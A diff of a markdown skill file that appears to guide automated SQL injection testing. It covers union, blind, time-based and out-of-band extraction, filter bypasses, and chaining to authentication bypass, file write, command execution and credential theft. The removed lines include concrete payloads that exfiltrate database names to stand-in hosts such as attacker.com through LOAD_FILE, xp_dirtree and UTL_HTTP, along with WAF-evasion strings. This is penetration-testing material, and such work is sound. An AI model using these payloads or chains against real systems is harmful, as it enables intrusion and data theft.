@@ -2,191 +2,230 @@
 name: sql-injection
 description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
 metadata:
-  version: '1.0'
+  version: 1.0.0
 ---
 
 # SQL Injection
 
-SQLi remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect.
+SQL injection remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, query-builder edges, document and expression surfaces, out-of-band exfiltration, and subtle blind channels. Treat every concatenation of input into a statement as suspect.
 
 ## Attack Surface
 
-**Databases**
-- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
-- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins
+**Statement Slots**
+- **Literal and identifier positions**: string literals, numeric positions, and identifier slots such as table and column names.
+- **Clause fragments**: filter fragments, sort clauses, grouping clauses, and paging clauses.
+- **Embedded filters**: batch and bulk endpoints and report generators that embed filters directly.
 
 **Integration Paths**
-- ORMs, query builders, stored procedures
-- Search servers, reporting/exporters
+- **Builder and mapper paths**: query builders, object mappers, and stored procedures.
+- **Secondary engines**: search servers, reporting engines, and exporters.
 
 **Input Locations**
-- Path/query/body/header/cookie
-- Mixed encodings (URL, JSON, XML, multipart)
-- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
-- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs
-- JSON coercion or array containment operators
-- Batch/bulk endpoints and report generators that embed filters directly
+- **Carrier locations**: path, query, body, header, and cookie.
+- **Mixed encodings**: URL, structured body, document formats, multipart.
+- **Document and array operators**: exposed through the query layer.
+- **Second-order inputs**: stored values that a later query interpolates.
+
+## Reconnaissance
+
+### Query-Shape Inference
+
+- **Operation shape**: identify the operation shape (read, insert, update, delete) and which clauses are present.
+- **Position type**: determine whether input lands in an identifier position or a value position; the escape rules differ.
+- **Statement inference**: note ordering, arity, and paging behavior that reveal the underlying statement before any payload is sent.
+- **Authenticated surfaces**: treat authenticated-only surfaces as first-class targets: internal tooling often runs an over-privileged account, and edge controls frequently whitelist authenticated traffic.
+
+### Error Fingerprinting
+
+- **Malformed-value probe**: send malformed values and read the failure text for parser, type, and constraint detail.
+- **Probe comparison**: compare a benign probe with a shaped probe to separate inquiry errors from statement errors.
+- **Baseline recording**: record the stable baseline error shape per endpoint so a differential is attributable.
+
+### Channel Calibration
+
+- **Paired differential**: establish a paired true-and-false differential on the tamest predicate available.
+- **Response normalization**: normalize the response (length, digest, entity tag, presence headers) so templating noise does not mask the signal.
+- **Latency baseline**: measure a latency baseline before any gated delay is attempted.
 
 ## Detection Channels
 
-**Error-Based**
-- Provoke type/constraint/parser errors revealing stack/version/paths
+- **Error text**: error text carrying type, constraint, or parser detail from a crafted probe.
+- **Error-text change**: error-text change between a benign probe and a shaped probe, which separates shaping success from failure.
+- **Paired differential**: paired differential across status, body, length, and presence headers between a true predicate and its false pair.
+- **Stable per-pair verdict**: stable per-pair verdict and normalized digest that separate a reachable truth signal from templating noise and random variance.
+- **Response-time delay**: response-time delay over a calibrated baseline, confirmed by repeated samples.
+- **Delay-baseline record**: delay-baseline record that separates database-induced latency from network and CPU noise.
+- **Rendered appended rows**: rendered appended rows carrying data from outside the intended query.
+- **Row-count change**: row-count change between arity probes, which separates wrong column counts from the correct one.
+- **Coercion error text**: coercion error text that separates a misaligned type attempt from an aligned one during alignment.
+- **Metadata echo**: stable metadata echo confirming version, current user, and database name through the established channel.
+- **Callback receipt**: callback receipt at an operated listener carrying an embedded label from the database.
+- **Token correlation**: per-probe token correlation binding one inbound hit to exactly one outbound request.
+- **Ordered-output shaping**: ordered-output shaping where sort and paging contexts carry the predicate into visible row order.
+- **Fallback signals**: fallback signals where one channel answers in place of another: a rendered row where filtering removes shaping, a content differential where timing stays hidden, and a differential where egress filtering removes callbacks.
 
-**Boolean-Based**
-- Pair requests differing only in predicate truth
-- Diff status/body/length/ETag
+## Adversarial Capabilities
 
-**Time-Based**
-- `SLEEP`/`pg_sleep`/`WAITFOR`
-- Use subselect gating to avoid global latency noise
+- **SQL injection testing**: presupposes a query-reaching input, a controllable predicate or payload slot, and a readback channel, and it consumes all three.
+- **Query-reaching parameter**: reach a parameter that flows into a statement, including identifier slots, filter fragments, and sort and paging clauses.
+- **Shape inference**: infer the statement shape from ordering, arity, and error behavior before payload assembly.
+- **Boolean oracle**: read paired true-and-false responses as a boolean oracle, with a normalized digest to remove templating noise.
+- **Listener operation**: operate a listener for out-of-band egress and mint a unique token per probe.
+- **Latency measurement**: measure latency against a calibrated baseline when no content channel answers.
+- **Privileged target**: hold a privileged target or an authentication boundary so a bypass converts into data or access.
 
-**Out-of-Band (OAST)**
-- DNS/HTTP callbacks via DB-specific primitives
+## Trust Assumptions
 
-## DBMS Primitives
-
-### MySQL
-
-- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
-- Error-based: `extractvalue()`/`updatexml()` (older), JSON functions for error shaping
-- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege, secure_file_priv)
-- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
-- Time: `SLEEP(n)`, `BENCHMARK`
-- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS funcs sometimes leak
-
-### PostgreSQL
-
-- Version/user/db: `version()`, `current_user`, `current_database()`
-- Error-based: raise exception via unsupported casts or division by zero; `xpath()` errors in xml2
-- OOB: `COPY (program ...)` or dblink/foreign data wrappers (when enabled); http extensions
-- Time: `pg_sleep(n)`
-- Files: `COPY table TO/FROM '/path'` (requires superuser), `lo_import`/`lo_export`
-- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` with lateral/CTE for blind extraction
-
-### MSSQL
-
-- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
-- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) if enabled
-- Exec: `xp_cmdshell` (often disabled), `OPENROWSET`/`OPENDATASOURCE`
-- Time: `WAITFOR DELAY '0:0:5'`; heavy functions cause measurable delays
-- Error-based: convert/parse, divide by zero, `FOR XML PATH` leaks
-
-### Oracle
-
-- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
-- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permissions dependent)
-- Time: `dbms_lock.sleep(n)`
-- Error-based: `to_number`/`to_date` conversions, `XMLType`
-- File: `UTL_FILE` with directory objects (privileged)
+- **The agreement**: user input reaches the database as a bound value, never as statement text or an identifier.
+- **Held clauses**: the agreement holds values to parameter binding, holds identifiers and operators to an application-chosen set, holds the statement grammar to the application's own fragments, and holds database egress to destinations the application intended.
+- **Leak condition**: data and control leak when any clause fails: a quote escapes a literal, a fragment widens the predicate, an identifier is interpolated, or the database reaches an attacker-chosen destination.
+- **The failing clause**: each variant breaks one clause on a different channel: rendering, shaping, truth-differencing, timing, or egress.
 
 ## Key Vulnerabilities
 
-### UNION-Based Extraction
+### Union-Based Extraction
 
-- Determine column count and types via `ORDER BY n` and `UNION SELECT null,...`
-- Align types with `CAST`/`CONVERT`; coerce to text/json for rendering
-- When UNION is filtered, switch to error-based or blind channels
+- **Arity probing**: determine column count and types by arity probing, then align types so the appended result renders.
+- **Channel fallback**: when the union path is filtered, switch to shaping, differential, timing, or egress channels.
 
-### Blind Extraction
+### Error-Based Extraction
 
-- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
-- Binary search on character space for fewer requests
-- Encode outputs (hex/base64) to normalize
-- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`
+- **Failure-text internals**: failure text shaped by type, constraint, or parser errors carries internals: version, user, database name, and path detail.
+- **Shaping proof**: error shaping needs proving first: compare a benign probe with a shaped probe until the differential is stable.
+- **Fallback answers**: where shaping is filtered, a rendered row or a union fallback still answers.
 
-### Out-of-Band
+### Boolean-Blind Extraction
 
-- Prefer OAST to minimize noise and bypass strict response paths
-- Embed data in DNS labels or HTTP query params
-- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
-- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
-- MySQL: `LOAD_FILE` with UNC path
+- **Bit-by-bit branching**: branch on single-bit predicates with substring and comparison functions, then extract bit by bit.
+- **Binary search**: binary search over the character space reduces requests.
+- **Normalization discipline**: normalize responses and keep a stable per-pair verdict, or templating noise will drown the signal.
+- **Order channel**: sort and paging contexts carry the predicate into visible order, which is a second differential surface.
 
-### Write Primitives
+### Time-Blind Extraction
 
-- Auth bypass: inject OR-based tautologies or subselects into login checks
-- Privilege changes: update role/plan/feature flags when UPDATE is injectable
-- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, `xp_cmdshell` redirection
-- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow
+- **Gated delays**: gate delays inside a conditional expression and confirm against a calibrated baseline.
+- **Delay discipline**: use short gated delays to reduce noise; a stable repeated-sample verdict separates signal from jitter.
+- **Channel preference**: where a content differential also answers, prefer it over the timing channel.
 
-### ORM and Query Builders
+### Out-of-Band Extraction
 
-- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER clauses
-- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
-- JSON containment operators exposed by ORMs (e.g., `@>` in PostgreSQL) with raw fragments
-- Parameter mismatch: partial parameterization where operators or lists remain unbound (`IN (...)`)
+- **Egress preference**: prefer egress channels to bypass strict response paths and minimize noise.
+- **Label embedding**: embed data in name-resolution labels or fetch parameters, and mint a unique token per probe to bind each hit to one request.
+- **Egress fallback**: where egress is filtered, fall back to a differential channel.
+
+### Database Primitive Families
+
+- **Metadata reads**: version, current user, and database name through the established channel.
+- **Error shaping**: functions and expressions that turn internals into response text.
+- **File reads and writes**: at the filesystem boundary, where the account holds the privilege and the policy allows it.
+- **Egress primitives**: through name resolution, fetch-capable extensions, and job interfaces.
+- **Timing primitives**: gated by the predicate.
+- **Document and operator expressions**: including containment and path operators with derived-table and common-table-expression smuggling.
+
+### Write and Control Primitives
+
+- **Authentication bypass**: inject an always-true predicate or a subselect into a login check.
+- **Privilege changes**: update role, plan, or feature state where the update path is injectable.
+- **File write and job creation**: where the account permissions allow, which converts data access into execution.
+
+### Query Builders and Object Mappers
+
+- **Dangerous fragments**: raw filter and sort helpers, and string interpolation into filter, membership, and ordering clauses.
+- **Identifier interpolation**: table and column names taken from user input.
+- **Builder-carried identifiers**: structured keys used as column aliases, and mapper filters forwarded into expression-shaped operators, reach interpolation through the builder rather than through a value position.
+- **Document operator passthrough**: containment and array operators exposed by the mapper with raw fragments.
+- **Parameter mismatch**: partial binding where operators or lists remain interpolated.
 
 ### Uncommon Contexts
 
-- ORDER BY/GROUP BY/HAVING with `CASE WHEN` for boolean channels
-- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
-- Full-text/search helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with payload mixing
-- XML/JSON functions: error generation via malformed documents/paths
+- **Sort, group, and having contexts**: with conditional expressions for boolean channels.
+- **Paging clauses**: inject into the offset to produce measurable timing or page-shape differences.
+- **Full-text and search helpers**: with mixed payload shapes.
+- **Document and path functions**: that generate errors from malformed input.
+
+## Advanced Techniques
+
+**Channel Selection and Fallback**
+- **Channel order**: pick the quietest reliable channel first and hold the loud ones in reserve: shaping, then differential, then timing, then egress.
+- **Channel substitution**: when a filter removes one channel, the same predicate answers on another; keep the predicate constant across attempts.
+
+**Query-Shape Smuggling**
+- **Subselect smuggling**: use subselects, derived tables, and common table expressions to hide payload shape where filters block direct clause placement.
+- **Scope relocation**: relocate the injection into a nested scope the filter does not cover.
+
+**Metadata-First Extraction**
+- **Metadata priority**: establish version, user, and database name first: they decide which primitive family is available.
+- **Business-critical jump**: jump from metadata to the business-critical tables, and keep lateral noise low.
 
 ## Bypass Techniques
 
-**Whitespace/Spacing**
-- `/**/`, `/**/!00000`, comments, newlines, tabs
-- `0xe3 0x80 0x80` (ideographic space)
+**Whitespace and Spacing**
+- **Comment separators**: comment forms as separators, newlines and tabs, and alternate whitespace characters.
 
 **Keyword Splitting**
-- `UN/**/ION`, `U%4eION`, backticks/quotes, case folding
+- **Keyword obfuscation**: inline comments inside keywords, encoded characters, case folding, and quoting variants.
 
-**Numeric Tricks**
-- Scientific notation, signed/unsigned, hex (`0x61646d696e`)
-
-**Encodings**
-- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
-- `char()`/`CONCAT_ws` to build tokens
+**Numeric and Encoding Tricks**
+- **Numeric forms**: scientific notation, signed and unsigned forms, and hexadecimal literals.
+- **Encoding layers**: double URL encoding and mixed Unicode normalization.
 
 **Clause Relocation**
-- Subselects, derived tables, CTEs (`WITH`), lateral joins to hide payload shape
+- **Clause placement**: subselects, derived tables, and common table expressions to place the payload outside the filtered fragment.
+
+**Filter-Aware Substitution**
+- **Operator substitution**: substitute an equivalent operator or function when the obvious one is filtered.
+- **Expression contexts**: expression contexts carry comparisons that the top-level filter rejects.
+- **Extended reading**: when this section does not fulfil the knowledge gap, extend the reading with the defence-bypass and proxy-techniques families.
+
+## Chaining Attacks
+
+- **Authentication bypass**: SQL injection to authentication bypass, then a second request to a privileged surface.
+- **File write**: SQL injection to file write, then retrieval from the served directory.
+- **Execution**: SQL injection to a job or process primitive where the database account holds it, which reaches execution.
+- **Network reach**: SQL injection to egress primitives, which doubles as internal network reach.
+- **Credential stores**: SQL injection to credential and token stores for movement to other systems.
 
 ## Testing Methodology
 
-1. **Identify query shape** - SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET
-2. **Determine input influence** - User input in identifiers vs values
-3. **Confirm injection class** - Reflective errors, boolean diffs, timing, or out-of-band callbacks
-4. **Choose quietest oracle** - Prefer error-based or boolean over noisy time-based
-5. **Establish extraction channel** - UNION (if visible), error-based, boolean bit extraction, time-based, or OAST/DNS
-6. **Pivot to metadata** - version, current user, database name
-7. **Target high-value tables** - auth bypass, role changes, filesystem access if feasible
+1. **Identify the query shape** - Operation type, presence of filter, sort, group, and paging clauses
+2. **Determine input influence** - User input in identifiers versus values
+3. **Confirm the injection class** - Shaped errors, paired differentials, timing, or egress callbacks
+4. **Choose the quietest channel** - Prefer shaping or paired differentials over noisy gated delays
+5. **Establish the extraction channel** - Rendered rows if visible, then shaping, bit extraction, timing, or egress
+6. **Pivot to metadata** - Version, current user, and database name
+7. **Target high-value tables** - Authentication bypass, privilege changes, and filesystem access where feasible
+8. **Confirm the effect** - Hold the predicate constant across channels and keep the request set minimal and repeatable
 
-## Validation
+## Variants
 
-1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
-2. Extract verifiable metadata (version, current user, database name) using the established channel
-3. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope
-4. Provide reproducible requests that differ only in the injected fragment
-5. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant)
+- sqli-union-extraction - Append result sets to visible responses, proving column count and type alignment first.
+- sqli-error-based-extraction - Read database internals from shaped failure text, including type, constraint, and parser detail.
+- sqli-boolean-blind-extraction - Diff paired true and false responses bit by bit when no rows render and no error shows.
+- sqli-time-blind-extraction - Measure predicate-driven delays bit by bit when only response latency varies.
+- sqli-oast-exfiltration - Correlate database callbacks with per-probe labels when in-band channels stay silent.
+- sql-injection-second-order - Plant a shaped value through a bound or escaped write, then trigger the operation that interpolates the stored text into a statement, including cross-context execution.
 
 ## False Positives
 
-- Generic errors unrelated to SQL parsing or constraints
-- Static response sizes due to templating rather than predicate truth
-- Artificial delays from network/CPU unrelated to injected function calls
-- Parameterized queries with no string concatenation, verified by code review
-
-## Impact
-
-- Direct data exfiltration and privacy/regulatory exposure
-- Authentication and authorization bypass via manipulated predicates
-- Server-side file access or command execution (platform/privilege dependent)
-- Persistent supply-chain impact via modified data, jobs, or procedures
+- **Generic errors**: generic errors unrelated to statement parsing or constraints.
+- **Static response sizes**: static response sizes driven by templating rather than predicate truth.
+- **Artificial delays**: artificial delays from network or CPU unrelated to the injected expression.
+- **Parameterized statements**: parameterized statements with no string concatenation, verified by code review.
+- **Vanishing differentials**: paired differentials that vanish once responses are normalized.
+- **Unbound egress hits**: egress hits whose source or timing cannot be bound to the injected primitive.
 
 ## Pro Tips
 
-1. Pick the quietest reliable oracle first; avoid noisy long sleeps
-2. Normalize responses (length/ETag/digest) to reduce variance when diffing
-3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise
-4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available
-5. Treat ORMs as thin wrappers: raw fragments often slip through; audit `whereRaw`/`orderByRaw`
-6. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly
-7. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels
-8. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types
-9. Validate mitigations with negative tests and code review; parameterize operators/lists correctly
-10. Document exact query shapes; defenses must match how the query is constructed, not assumptions
+- **Quiet channel first**: pick the quietest reliable channel first; avoid noisy long delays.
+- **Response normalization**: normalize responses (length, digest, entity tag) to reduce variance when differencing.
+- **Metadata first**: aim for metadata first, then move directly to business-critical tables.
+- **Channel switching**: when the union path fails, switch to shaping or bit extraction; prefer egress where available.
+- **Builder auditing**: treat query builders as thin wrappers: raw fragments slip through, so audit the raw helpers.
+- **Subselect smuggling**: use subselects and common table expressions to smuggle expressions when filters block direct placement.
+- **Document operators**: exploit document and array operators for side channels where the query layer exposes them.
+- **Portable payloads**: keep payloads portable; maintain per-engine dictionaries of functions and types.
+- **Statement documentation**: document the exact statement shape; defences must match how the statement is constructed.
 
 ## Summary
 
-Modern SQLi succeeds where authorization and query construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets SQL.
+SQL injection succeeds where authorization and statement construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets the statement.
